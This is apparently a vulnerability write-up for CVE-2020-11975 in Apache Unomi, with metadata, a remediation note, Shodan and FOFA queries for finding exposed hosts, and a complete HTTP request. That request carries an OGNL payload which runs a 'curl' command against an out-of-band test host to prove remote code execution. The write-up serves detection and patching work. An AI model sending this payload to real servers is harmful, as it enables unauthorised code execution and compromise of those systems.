---
layout: post
cve_id: CVE-2020-11975
title: Apache Unomi - Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-11975.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-11975.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Sourabh-Sahu
severity: critical
impact: 'Successful exploitation allows an attacker to execute arbitrary code on the
  server with the privileges of the Java process, potentially leading to complete
  system compromise.

  '
remediation: 'Update Apache Unomi to version 1.5.2 or later. Disable OGNL scripting
  in conditions if not required.

  '
reference:
- https://xz.aliyun.com/news/8157
- https://github.com/1135/unomi_exploit
- https://unomi.apache.org/security/cve-2020-11975.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-11975
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-11975
  cwe-id: CWE-94
  epss-score: 0.8271
  epss-percentile: 0.99211
  cpe: cpe:2.3:a:apache:unomi:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: apache
  product: unomi
  shodan-query: http.title:"Apache Unomi"
  fofa-query: title="Apache Unomi"
tags:
- cve
- cve2020
- apache
- unomi
- rce
- ognl
- oast
- vkev
- vuln
---

## üîç Vulnerability Description
Apache Unomi allows conditions to use OGNL scripting which offers the possibility to call static Java classes from the JDK that could execute code with the permission level of the running Java process, enabling attackers to execute arbitrary code.


## üåê HTTP Request
```nohighlight
POST /context.json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Connection: close
Content-Length: 736
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip
{
"personalizations":[
{
"id":"gender-test_anystr",
"strategy":"matching-first",
"strategyOptions":{
"fallback":"var2"
},
"contents":[
{
"filters":[
{
"condition":{
"parameterValues":{
"propertyName":"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"curl d5jofl1le0o35q12hug0au6rsi87se9m4.oast.pro\"))",
"comparisonOperator":"equals_anystr",
"propertyValue":"male_anystr"
},
"type":"profilePropertyCondition"
}
}
]
}
]
}
],
"sessionId":"test-demo-session-id"
}
```

